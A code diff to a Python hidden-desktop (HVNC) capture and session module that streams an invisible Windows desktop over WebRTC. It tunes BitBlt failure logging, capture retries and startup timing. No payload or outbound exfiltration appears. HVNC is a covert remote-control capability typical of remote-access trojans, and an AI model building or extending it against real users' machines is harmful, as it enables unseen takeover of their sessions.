@@ -741,11 +741,27 @@ class HiddenDesktopCapture:
                         )
                         if not result:
                             error = ctypes.get_last_error()
-                            if not hasattr(self, '_bitblt_error_logged'):
-                                logger.warning("BitBlt failed, error=%d", error)
-                                self._bitblt_error_logged = True
+                            # error=0 means the function failed but no specific error code
+                            # This usually happens when the desktop is not fully initialized
+                            # Track failure count for throttled logging
+                            if not hasattr(self, '_bitblt_fail_count'):
+                                self._bitblt_fail_count = 0
+                            self._bitblt_fail_count += 1
+                            
+                            # Log first 3 failures in detail, then throttle
+                            if self._bitblt_fail_count <= 3:
+                                logger.warning("BitBlt failed (attempt %d), error=%d - desktop may not be ready", 
+                                             self._bitblt_fail_count, error)
+                            elif self._bitblt_fail_count == 4:
+                                logger.warning("Suppressing further BitBlt failure logs")
+                            
                             gdi32.SelectObject(hdc_mem, old_bitmap)
                             return None
+                    
+                    # Reset fail counter on success
+                    if hasattr(self, '_bitblt_fail_count') and self._bitblt_fail_count > 0:
+                        logger.info("BitBlt recovered after %d failures", self._bitblt_fail_count)
+                        self._bitblt_fail_count = 0
                     
                     gdi32.SelectObject(hdc_mem, old_bitmap)
                     
@@ -809,21 +825,25 @@ class HiddenDesktopCapture:
         
         logger.info("Capture thread switched to hidden desktop: %s", self._desktop.name)
         
-        # Wait for desktop to be fully ready
-        # Hidden desktop needs time to initialize its DC and message queue
-        # Shell (explorer.exe) also needs time to create the desktop rendering context
-        time.sleep(2.0)
+        # Signal initialization early to allow WebRTC connection to proceed
+        # The capture will return None (black frames) until desktop is ready
+        # This is intentional - we want ICE to complete in parallel with desktop init
+        self._initialized.set()
+        
+        # Wait a short time for initial desktop setup
+        time.sleep(1.0)
         
         # Try a test capture to verify desktop is ready
-        for retry in range(5):
+        # Continue in background even if desktop isn't ready yet
+        for retry in range(10):
             test_frame = self._capture_frame()
             if test_frame:
                 logger.info("Desktop capture ready after %d retries", retry)
                 break
-            logger.debug("Desktop not ready, retry %d/5", retry + 1)
+            logger.debug("Desktop not ready, retry %d/10", retry + 1)
             time.sleep(0.5)
-        
-        self._initialized.set()
+        else:
+            logger.warning("Desktop capture starting despite incomplete initialization")
         
         frame_count = 0
         fail_count = 0
@@ -1164,12 +1184,16 @@ class HVNCSession:
         return self._capture.frame_size
     
     def start_shell(self) -> bool:
-        """Start Windows shell (explorer.exe) on hidden desktop and begin capture."""
+        """Start Windows shell (explorer.exe) on hidden desktop and begin capture.
+        
+        Note: This starts capture immediately to allow WebRTC connection to establish.
+        The capture thread will retry until desktop is ready, returning black frames initially.
+        """
         result = self._desktop.start_shell()
         if result:
-            # Wait for shell to fully initialize before starting capture
-            time.sleep(1.0)
-            # Now start capture - desktop should have content
+            # Start capture immediately - don't block WebRTC connection establishment
+            # Capture thread will retry until desktop is ready
+            # This allows ICE to complete while desktop initializes in parallel
             self._capture.start_capture()
             logger.info("Shell started and capture initialized")
         return result
